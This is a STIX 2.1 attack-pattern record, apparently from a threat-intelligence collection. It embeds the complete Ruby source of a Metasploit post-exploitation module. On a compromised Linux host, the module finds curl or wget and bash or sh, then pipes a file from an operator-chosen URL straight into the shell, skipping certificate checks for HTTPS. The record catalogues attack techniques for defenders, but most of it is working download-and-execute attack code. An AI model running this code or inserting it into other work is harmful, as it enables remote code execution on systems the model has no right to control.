{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d89191dc-99b5-444a-b5df-713d9fb1575b",
    "created": "2024-08-14T16:33:13.577227Z",
    "modified": "2024-08-14T16:33:13.57723Z",
    "name": "Linux Manage Download and Execute",
    "description": " This module downloads and runs a file with bash. It first tries to uses curl as its HTTP client and then wget if it's not found. Bash found in the PATH is used to execute the file.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/linux/manage/download_exec.rb",
            "external_id": "download_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Linux::System\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Linux Manage Download and Execute',\n        'Description' => %q{\n          This module downloads and runs a file with bash. It first tries to uses curl as\n          its HTTP client and then wget if it's not found. Bash found in the PATH is used\n          to execute the file.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Joshua D. Abraham <jabra[at]praetorian.com>',\n        ],\n        'Platform' => ['linux'],\n        'SessionTypes' => ['shell', 'meterpreter']\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('URL', [true, 'Full URL of file to download.'])\n      ]\n    )\n  end\n\n  def cmd_exec_vprint(cmd)\n    vprint_status(\"Executing: #{cmd}\")\n    output = cmd_exec(cmd)\n    if !output.empty?\n      vprint_status(output.to_s)\n    end\n    return\n  end\n\n  def exists_exe?(exe)\n    vprint_status \"Searching for #{exe} in the current $PATH...\"\n    path = get_env('PATH')\n    if path.nil? || path.empty?\n      return false\n      vprint_error 'No local $PATH set!'\n    else\n      vprint_status \"$PATH is #{path.strip!}\"\n    end\n\n    path.split(':').each do |p|\n      full_path = p + '/' + exe\n      vprint_status \"Searching for '#{full_path}' ...\"\n      return true if file_exist?(full_path)\n    end\n\n    return false\n  end\n\n  def search_http_client\n    print_status('Checking if curl exists in the path...')\n    if exists_exe?('curl')\n      print_good('curl available, using it')\n      @stdout_option = ''\n      @http_client = 'curl'\n      @ssl_option = '-k'\n      return\n    end\n\n    print_status('Checking if wget exists in the path...')\n    if exists_exe?('wget')\n      print_good('wget available, using it')\n      @http_client = 'wget'\n      @stdout_option = '-O-'\n      @ssl_option = '--no-check-certificate'\n      return\n    end\n  end\n\n  def search_shell\n    print_status('Checking if bash exists in the path...')\n    if exists_exe?('bash')\n      print_good('bash available, using it')\n      @shell = 'bash'\n      return\n    end\n\n    print_status('Checking if sh exists in the path...')\n    if exists_exe?('sh')\n      print_good('sh available, using it')\n      @shell = 'sh'\n      return\n    end\n  end\n\n  def run\n    search_http_client\n\n    if !@http_client\n      print_warning('neither curl nor wget available in the $PATH, aborting...')\n      return\n    end\n\n    search_shell\n\n    if !@shell\n      print_warning('neither bash nor sh available in the $PATH, aborting...')\n      return\n    end\n\n    if datastore['URL'].match(%r{^https://})\n      cmd_exec_vprint(\"#{@http_client} #{@stdout_option} #{@ssl_option} #{datastore['URL']} 2>/dev/null | #{@shell}\")\n    else\n      cmd_exec_vprint(\"#{@http_client} #{@stdout_option} #{datastore['URL']} 2>/dev/null | #{@shell}\")\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "['linux']"
    ]
}